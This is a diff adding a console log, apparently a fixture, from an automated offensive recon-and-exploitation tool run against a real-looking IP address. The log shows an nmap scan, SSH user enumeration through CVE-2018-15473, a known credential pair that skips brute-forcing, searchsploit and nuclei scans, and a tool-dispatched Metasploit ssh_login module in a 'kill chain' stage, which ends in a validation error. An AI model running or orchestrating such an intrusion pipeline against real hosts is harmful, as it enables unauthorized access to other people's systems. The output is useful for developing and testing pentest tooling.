@@ -1,0 +1,49 @@
+Choice(s) e.g. 1 2 4 or a: n
+
+[*] Starting concurrent recon on: 83.166.241.164
+──────────────────────────────────────────────────
+  [*] nmap -sV -sC -T4 --open -Pn -sT 83.166.241.164
+      [47s] 22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
+  [*] Shodan host lookup: 83.166.241.164
+  [!] Shodan host error: No information available for that IP.
+──────────────────────────────────────────────────
+[+] Recon complete.
+
+  [*] No web ports open — skipping wpscan, sqlmap, nikto
+  [*] SSH detected — running user enumeration first...
+  [*] SSH User Enumeration (CVE-2018-15473): 83.166.241.164:22
+  [*] Phase 1: Testing 4 canary users for false-positive detection...
+      [+] VALID USER: aaa_fake_user_m7k
+      [+] VALID USER: support
+      [+] VALID USER: root
+      [+] VALID USER: admin
+  [!] ALL 4 canary users returned valid (including fake names)
+  [!] Server is PATCHED — aborting full enumeration (saves ~2 min)
+  [!] SSH user enum results UNRELIABLE (server patched) — using defaults
+
+  [*] Phase 2: SSH bruteforce with default users...
+  [+] SKIP BRUTEFORCE: Credentials already known for ssh://83.166.241.164
+      Known: support:fixture-password-123
+
+  [*] Phase 3: Kill chain vulnerability assessment...
+
+  [KILL CHAIN] Stage 1: Vulnerability Assessment — 83.166.241.164
+  [*] Running searchsploit for 1 services...
+    [*] searchsploit: OpenSSH 7.4
+  [*] Running nuclei template scan...
+
+     [Running Action] exploit_select 83.166.241.164 port_open -> 22/tcp (ssh) [OpenSSH 7.4 (protocol 2.0)] | service_version -> ssh:22:OpenSSH 7.4 (protocol 2.0)
+  [*] Dispatching tool: exploit_select (via exploit_select)
+      -> Args: ['83.166.241.164', 'port_open -> 22/tcp (ssh) [OpenSSH 7.4 (protocol 2.0)] | service_version -> ssh:22:OpenSSH 7.4 (protocol 2.0)'], Kwargs: {}
+     [+] Action Fact: service_status -> exploit_selection_completed:1
+     [+] Action Fact: exploit_candidate -> auxiliary/scanner/ssh/ssh_login on ssh:22 [OpenSSH 7.4 (protocol 2.0)]
+     [+] Action Fact: msf_module -> auxiliary/scanner/ssh/ssh_login
+     [+] Action Fact: payload_recommendation -> none/check-only
+     [+] Action Fact: verification_command -> msf_check 83.166.241.164 auxiliary/scanner/ssh/ssh_login RHOSTS=83.166.241.164 RPORT=22
+     [+] Action Fact: active_command -> msf_run 83.166.241.164 auxiliary/scanner/ssh/ssh_login RHOSTS=83.166.241.164 RPORT=22
+     [Running Follow-up] msf_check 83.166.241.164 auxiliary/scanner/ssh/ssh_login RHOSTS=83.166.241.164 RPORT=22
+  [*] Dispatching tool: msf_check (via msf_check)
+      -> Args: ['83.166.241.164', 'auxiliary/scanner/ssh/ssh_login', 'RHOSTS=83.166.241.164 RPORT=22'], Kwargs: {}
+  [*] MSF Module: auxiliary/scanner/ssh/ssh_login
+  [*] MSF Options: {'RHOSTS': '83.166.241.164', 'RPORT': '22'}
+      [MSF 2s] [-] Msf::OptionValidateError The following options failed to validate:
